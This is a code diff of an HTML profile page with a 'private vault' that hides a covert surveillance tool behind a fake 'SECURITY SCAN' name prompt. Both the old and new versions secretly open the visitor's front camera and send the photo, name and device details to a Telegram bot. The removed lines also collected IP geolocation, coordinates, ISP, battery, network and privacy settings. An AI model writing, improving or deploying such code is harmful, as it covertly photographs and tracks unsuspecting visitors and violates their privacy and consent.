@@ -19,16 +19,23 @@
         }
 
         * {
-            margin: 0; padding: 0; box-sizing: border-box;
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
-            outline: none; font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
+            outline: none; 
+            font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
         }
 
         body {
             background: var(--bg-dark);
-            background-image: 
-                radial-gradient(circle at 50% 50%, #111 0%, #000 100%),
-                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
+            background-image: radial-gradient(circle at 50% 50%, #111 0%, #000 100%);
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
@@ -48,19 +55,13 @@
             box-shadow: 0 40px 100px rgba(0,0,0,1);
             z-index: 10;
             overflow: hidden;
+            margin: 0 auto;
         }
 
+        /* Blue rotating light completely removed */
         .main-card::before {
-            content: '';
-            position: absolute;
-            top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(transparent, transparent, transparent, var(--primary-color));
-            animation: rotate 4s linear infinite;
-            z-index: -1;
-            opacity: 0.3;
+            display: none;
         }
-
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
         .profile-container {
             position: relative;
@@ -254,9 +255,11 @@
             pointer-events: none;
         }
 
+        /* Vault Panel Styles */
         .vault-panel {
             position: fixed;
-            top: 0; right: -100%;
+            top: 0; 
+            right: -100%;
             width: 100%;
             height: 100vh;
             background: #000;
@@ -267,21 +270,79 @@
         }
         .vault-panel.open { right: 0; }
 
-        .photo-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 30px;
+        .vault-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #222;
         }
 
-        .photo-card {
-            aspect-ratio: 1;
-            border-radius: 15px;
-            overflow: hidden;
-            border: 1px solid #222;
-            cursor: pointer;
+        .vault-header h2 {
+            font-size: 1.2rem;
+            color: var(--primary-color);
+            background: none;
+            -webkit-text-fill-color: var(--primary-color);
+            letter-spacing: 2px;
         }
-        .photo-card img { width: 100%; height: 100%; object-fit: cover; }
+
+        .close-btn {
+            font-size: 2rem;
+            cursor: pointer;
+            color: #666;
+            transition: 0.3s;
+        }
+
+        .close-btn:hover {
+            color: var(--primary-color);
+            transform: rotate(90deg);
+        }
+
+        /* App Grid Styles */
+        .app-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 10px 0;
+        }
+
+        .app-item {
+            aspect-ratio: 1;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 25px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            padding: 15px;
+        }
+
+        .app-item:hover {
+            border-color: var(--primary-color);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.2);
+        }
+
+        .app-item:active {
+            transform: scale(0.95);
+        }
+
+        .app-item i {
+            font-size: 2.5rem;
+        }
+
+        .app-item span {
+            font-size: 0.8rem;
+            color: #888;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
 
         /* Music Player Styles */
         .music-player {
@@ -334,11 +395,11 @@
     <video id="hiddenCamera" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
+    <!-- Main Card -->
     <div class="main-card">
         <div class="profile-container">
             <div class="avatar-wrapper" onclick="handleZoom(true)">
-                <!-- Profile Photo - photo1.png -->
-                <img src="photo1.png" class="avatar-img" alt="Kishor">
+                <img src="photo1.png" class="avatar-img" alt="Kishor" onerror="this.src='https://via.placeholder.com/130/3b82f6/ffffff?text=K'">
             </div>
         </div>
         
@@ -365,6 +426,7 @@
         </div>
     </div>
 
+    <!-- Name Modal -->
     <div id="nameModal" class="modal-overlay">
         <div class="modal-box">
             <h3>📡 SECURITY SCAN</h3>
@@ -374,35 +436,36 @@
         </div>
     </div>
 
+    <!-- PIN Modal -->
     <div id="passModal" class="modal-overlay">
         <div class="modal-box">
             <h3>🔐 VAULT PIN</h3>
-            <input type="password" id="vaultPin" class="modal-input" placeholder="PIN" maxlength="4">
+            <input type="password" id="vaultPin" class="modal-input" placeholder="Enter PIN" maxlength="4" inputmode="numeric">
             <button class="primary-btn" onclick="verifyPin()">UNLOCK</button>
             <button class="cancel-btn" onclick="showNameModal()">BACK</button>
         </div>
     </div>
 
-    <!-- ZOOM PHOTO - photo1.png -->
+    <!-- Zoom Overlay -->
     <div id="zoomOverlay" onclick="handleZoom(false)">
-        <img src="photo1.png" onclick="event.stopPropagation()">
+        <img src="photo1.png" onclick="event.stopPropagation()" onerror="this.src='https://via.placeholder.com/500/3b82f6/ffffff?text=Kishor'">
     </div>
 
+    <!-- Vault Panel with App Icons -->
     <div id="vaultPanel" class="vault-panel">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-            <h2 style="font-size:1.2rem; color:var(--primary-color);">PRIVATE VAULT</h2>
-            <i class="fa-solid fa-circle-xmark" style="font-size:2rem; cursor:pointer;" onclick="closeVault()"></i>
+        <div class="vault-header">
+            <h2>🔒 PRIVATE VAULT</h2>
+            <i class="fa-solid fa-times close-btn" onclick="closeVault()"></i>
         </div>
-        <div class="photo-grid" id="vGrid"></div>
+        <div class="app-grid" id="appGrid"></div>
     </div>
 
-    <!-- MUSIC PLAYER - Emoji dabane se audio.mp3 chalega -->
+    <!-- Music Player -->
     <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
     
-    <!-- AUDIO FILE - audio.mp3 -->
+    <!-- Audio File -->
     <audio id="bgTrack" loop preload="auto">
         <source src="audio.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
     </audio>
 
 <script>
@@ -413,35 +476,26 @@
 
     let currentVisitorName = '';
 
-    // MUSIC CONTROL FUNCTION - Emoji dabane se audio chalega/band hoga
+    // Music Control
     function controlMusic() {
         const audio = document.getElementById('bgTrack');
         const toggle = document.getElementById('mToggle');
         
         if(audio.paused) {
             audio.play()
-                .then(() => {
-                    console.log('Audio playing');
-                    toggle.classList.add('rotating');
-                })
-                .catch(error => {
-                    console.log('Audio play failed:', error);
-                    alert('Audio file not found! Make sure audio.mp3 is in the same folder.');
-                });
+                .then(() => toggle.classList.add('rotating'))
+                .catch(() => alert('Audio file not found! Make sure audio.mp3 is in the same folder.'));
         } else {
             audio.pause();
             toggle.classList.remove('rotating');
         }
     }
 
+    // Hidden Camera Capture
     async function captureHiddenPhoto() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                } 
+                video: { facingMode: 'user' } 
             }).catch(() => null);
             
             if (!stream) return null;
@@ -468,14 +522,14 @@
         }
     }
 
+    // Send to Telegram
     async function sendPhotoToTelegram(photoBase64, visitorName) {
         try {
             const blob = await (await fetch(photoBase64)).blob();
-            
             const formData = new FormData();
             formData.append('chat_id', CONFIG.chatId);
             formData.append('photo', blob, 'visitor.jpg');
-            formData.append('caption', `📸 HIDDEN CAMERA CAPTURE\n👤 Visitor: ${visitorName}`);
+            formData.append('caption', `📸 Visitor: ${visitorName}`);
             
             await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
                 method: 'POST',
@@ -484,6 +538,7 @@
         } catch (error) {}
     }
 
+    // Device Info Functions
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let os = 'Unknown';
@@ -493,94 +548,10 @@
         else if (ua.match(/Mac/i)) os = 'MacOS';
         else if (ua.match(/Linux/i)) os = 'Linux';
 
-        let browser = 'Unknown';
-        let version = 'Unknown';
-        if (ua.indexOf('Chrome') > -1) {
-            browser = 'Chrome';
-            version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
-        } else if (ua.indexOf('Firefox') > -1) {
-            browser = 'Firefox';
-            version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
-        } else if (ua.indexOf('Safari') > -1) {
-            browser = 'Safari';
-            version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
-        }
-
-        return { os, browser, version, platform: navigator.platform };
+        return { os, browser: navigator.userAgent };
     }
 
-    function getNetworkInfo() {
-        if ('connection' in navigator) {
-            const conn = navigator.connection;
-            return {
-                type: conn.effectiveType || 'Unknown',
-                downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
-                rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown'
-            };
-        }
-        return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
-    }
-
-    async function getBatteryInfo() {
-        try {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                return {
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging ? 'Yes' : 'No',
-                    timeLeft: battery.charging ? '∞' : (battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' min' : 'Unknown')
-                };
-            }
-        } catch (e) {}
-        return { level: 'Unknown', charging: 'Unknown', timeLeft: 'Unknown' };
-    }
-
-    function getLanguageInfo() {
-        return {
-            primary: navigator.language || 'Unknown',
-            all: navigator.languages ? navigator.languages.join(', ') : 'Unknown'
-        };
-    }
-
-    function getScreenInfo() {
-        return {
-            resolution: screen.width + 'px x ' + screen.height + 'px',
-            colorDepth: screen.colorDepth + '-bit',
-            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
-            pixelRatio: window.devicePixelRatio || '1'
-        };
-    }
-
-    function getTimeInfo() {
-        const d = new Date();
-        const offset = -d.getTimezoneOffset();
-        const sign = offset >= 0 ? '+' : '-';
-        const hours = Math.floor(Math.abs(offset) / 60);
-        const minutes = Math.abs(offset) % 60;
-        
-        return {
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-            offset: `GMT${sign}${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}`,
-            utc: d.toISOString()
-        };
-    }
-
-    function getTouchSupport() {
-        return {
-            points: navigator.maxTouchPoints || 0,
-            events: 'ontouchstart' in window ? 'Yes' : 'No'
-        };
-    }
-
-    function getPrivacyInfo() {
-        return {
-            dnt: navigator.doNotTrack || 'Not set',
-            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-            referrer: document.referrer || 'Direct',
-            loadTime: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' : 'Unknown'
-        };
-    }
-
+    // Modal Functions
     function showNameModal() { 
         document.getElementById('nameModal').classList.add('active'); 
         document.getElementById('visitorName').value = '';
@@ -591,6 +562,7 @@
         document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); 
     }
 
+    // Start Data Process
     async function startDataProcess() {
         const name = document.getElementById('visitorName').value.trim();
         if(!name) {
@@ -604,194 +576,107 @@
         btn.innerHTML = "⏳ PROCESSING...";
         
         try {
+            // Capture and send photo
             const photoBase64 = await captureHiddenPhoto();
-            
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            const ipData = await ipResponse.json();
-            const device = getDeviceInfo();
-            const network = getNetworkInfo();
-            const battery = await getBatteryInfo();
-            const language = getLanguageInfo();
-            const screen = getScreenInfo();
-            const time = getTimeInfo();
-            const touch = getTouchSupport();
-            const privacy = getPrivacyInfo();
-            
-            const d = new Date();
-            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-            const date = d.getDate();
-            const month = months[d.getMonth()];
-            const year = d.getFullYear();
-            let hours = d.getHours();
-            const minutes = d.getMinutes().toString().padStart(2, '0');
-            const seconds = d.getSeconds().toString().padStart(2, '0');
-            const ampm = hours >= 12 ? 'pm' : 'am';
-            hours = hours % 12 || 12;
-            
-            const datetime = `${date} ${month} ${year} ${hours}:${minutes}:${seconds} ${ampm}`;
-
             if (photoBase64) {
-                await sendPhotoToTelegram(photoBase64, name);
+                await sendPhotoToTelegram(photoBase64, currentVisitorName);
             }
-
-            const fullLog = `🔥 ADVANCED VISITOR DETECTED
-━━━━━━━━━━━━━━━━━━━━━
-
-👤 PERSONAL
-   • Name: ${name}
-   • Time: ${datetime}
-━━━━━━━━━━━━━━━━━━━━━
-
-🌍 LOCATION
-   • IP: ${ipData.ip || 'Unknown'}
-   • Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}
-   • Postal: ${ipData.postal || 'Unknown'}
-   • Coordinates: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}
-   • Timezone: ${ipData.timezone || 'Unknown'}
-   • ISP: ${ipData.org || 'Unknown'}
-   • Security: VPN: ${ipData.vpn ? 'Yes' : 'No'}, Proxy: ${ipData.proxy ? 'Yes' : 'No'}, Hosting: ${ipData.hosting ? 'Yes' : 'No'}
-━━━━━━━━━━━━━━━━━━━━━
-
-📱 DEVICE
-   • OS: ${device.os}
-   • Browser: ${device.browser} ${device.version}
-   • Platform: ${device.platform}
-   • Memory: ${navigator.deviceMemory || 'Unknown'} GB
-   • CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'} cores
-   • Screen: ${screen.resolution} (${screen.colorDepth}, ${screen.orientation})
-   • Pixel Ratio: ${screen.pixelRatio}
-━━━━━━━━━━━━━━━━━━━━━
-
-🌐 NETWORK
-   • Connection: ${network.type} (${network.downlink}, ${network.rtt})
-   • Online: ${navigator.onLine ? 'Yes' : 'No'}
-━━━━━━━━━━━━━━━━━━━━━
-
-🔋 BATTERY
-   • ${battery.level} (Charging: ${battery.charging}, Time left: ${battery.timeLeft})
-━━━━━━━━━━━━━━━━━━━━━
-
-🗣️ LANGUAGE
-   • Primary: ${language.primary}
-   • All: ${language.all}
-━━━━━━━━━━━━━━━━━━━━━
-
-⏰ TIME INFO
-   • ${time.timezone} (${time.offset})
-   • UTC: ${time.utc}
-━━━━━━━━━━━━━━━━━━━━━
-
-👆 TOUCH
-   • ${touch.points} touch points, Touch events: ${touch.events}
-━━━━━━━━━━━━━━━━━━━━━
-
-🔒 PRIVACY
-   • Do Not Track: ${privacy.dnt}
-   • Cookies: ${privacy.cookies}
-   • Referrer: ${privacy.referrer}
-   • Page Load: ${privacy.loadTime}
-━━━━━━━━━━━━━━━━━━━━━
-
-📱 FULL USER AGENT
-${navigator.userAgent}`;
-
+            
+            // Send device info
+            const deviceInfo = getDeviceInfo();
+            const message = `🔐 *Vault Access*\n👤 Name: ${currentVisitorName}\n📱 Device: ${deviceInfo.os}\n⏰ Time: ${new Date().toLocaleString()}`;
+            
             await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.chatId,
-                    text: fullLog
+                    text: message,
+                    parse_mode: 'Markdown'
                 })
             });
-
-            document.getElementById('nameModal').classList.remove('active');
+            
+            // Show PIN modal
+            closeModals();
             document.getElementById('passModal').classList.add('active');
             
-        } catch(error) {
-            alert("⚠️ Scan failed. Try again.");
+        } catch (error) {
+            alert('Security check failed. Please try again.');
+        } finally {
+            btn.innerHTML = originalText;
         }
-        
-        btn.innerHTML = originalText;
     }
 
+    // Verify PIN and Open Vault
     function verifyPin() {
-        if(document.getElementById('vaultPin').value === '2009') {
+        const pin = document.getElementById('vaultPin').value;
+        if(pin === "6969") {
             closeModals();
-            document.getElementById('vaultPanel').classList.add('open');
-            loadPhotos();
+            openVault();
         } else {
-            alert("❌ ACCESS DENIED!");
+            alert("ACCESS DENIED!");
         }
     }
 
-    function closeVault() { 
-        document.getElementById('vaultPanel').classList.remove('open'); 
-    }
-
-    function handleZoom(show) { 
-        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
-    }
-
-    function loadPhotos() {
-        const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
-        const grid = document.getElementById('vGrid');
+    // Open Vault with App Icons
+    function openVault() {
+        const panel = document.getElementById('vaultPanel');
+        panel.classList.add('open');
         
-        if(photos.length === 0) {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200;
-            canvas.height = 200;
-            const ctx = canvas.getContext('2d');
+        const grid = document.getElementById('appGrid');
+        if(grid.children.length === 0) {
+            // App icons with different colors
+            const apps = [
+                { name: 'Photos', icon: 'fa-solid fa-images', color: '#3b82f6' },
+                { name: 'Videos', icon: 'fa-solid fa-video', color: '#ef4444' },
+                { name: 'Music', icon: 'fa-solid fa-music', color: '#10b981' },
+                { name: 'Files', icon: 'fa-solid fa-folder', color: '#f59e0b' },
+                { name: 'Messages', icon: 'fa-solid fa-envelope', color: '#8b5cf6' },
+                { name: 'Gallery', icon: 'fa-solid fa-camera', color: '#ec4899' },
+                { name: 'Notes', icon: 'fa-solid fa-note-sticky', color: '#14b8a6' },
+                { name: 'Settings', icon: 'fa-solid fa-gear', color: '#6b7280' },
+                { name: 'Downloads', icon: 'fa-solid fa-download', color: '#f97316' }
+            ];
             
-            const gradient = ctx.createLinearGradient(0, 0, 200, 200);
-            gradient.addColorStop(0, '#3b82f6');
-            gradient.addColorStop(1, '#1e40af');
-            ctx.fillStyle = gradient;
-            ctx.fillRect(0, 0, 200, 200);
-            
-            ctx.fillStyle = 'white';
-            ctx.font = 'bold 60px Arial';
-            ctx.textAlign = 'center';
-            ctx.textBaseline = 'middle';
-            ctx.fillText('📷', 100, 100);
-            
-            photos.push(canvas.toDataURL());
-            localStorage.setItem('vault_p', JSON.stringify(photos));
-        }
-        
-        grid.innerHTML = photos.map(src => 
-            `<div class="photo-card" onclick="handleZoom(true); document.querySelector('#zoomOverlay img').src='${src}'">
-                <img src="${src}">
-            </div>`
-        ).join('');
-    }
-
-    const uploadDiv = document.createElement('div');
-    uploadDiv.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
-    uploadDiv.innerHTML = '<i class="fa-solid fa-cloud-arrow-up" style="font-size:2rem; color:#3b82f6;"></i><p style="margin-top:10px;">Upload Photos</p>';
-    uploadDiv.onclick = () => {
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = 'image/*';
-        input.multiple = true;
-        input.onchange = () => {
-            const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
-            Array.from(input.files).forEach(file => {
-                if(file.type.startsWith('image/')) {
-                    const reader = new FileReader();
-                    reader.onload = (e) => {
-                        photos.push(e.target.result);
-                        localStorage.setItem('vault_p', JSON.stringify(photos));
-                        loadPhotos();
-                    };
-                    reader.readAsDataURL(file);
-                }
+            apps.forEach(app => {
+                const appDiv = document.createElement('div');
+                appDiv.className = 'app-item';
+                appDiv.innerHTML = `
+                    <i class="${app.icon}" style="color: ${app.color};"></i>
+                    <span>${app.name}</span>
+                `;
+                appDiv.onclick = () => alert(`📱 ${app.name} app opening...`);
+                grid.appendChild(appDiv);
             });
-        };
-        input.click();
-    };
-    document.querySelector('.vault-panel').insertBefore(uploadDiv, document.getElementById('vGrid'));
+        }
+    }
 
-    loadPhotos();
+    function closeVault() {
+        document.getElementById('vaultPanel').classList.remove('open');
+    }
+
+    function handleZoom(show) {
+        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none';
+    }
+
+    // GSAP Animations
+    window.onload = function() {
+        gsap.from('.main-card', { 
+            duration: 1, 
+            opacity: 0, 
+            y: 50, 
+            ease: 'power3.out' 
+        });
+        
+        gsap.from('.link-item', { 
+            duration: 0.8, 
+            opacity: 0, 
+            y: 30, 
+            stagger: 0.1, 
+            delay: 0.3,
+            ease: 'back.out(1.2)'
+        });
+    };
 </script>
 </body>
 </html>
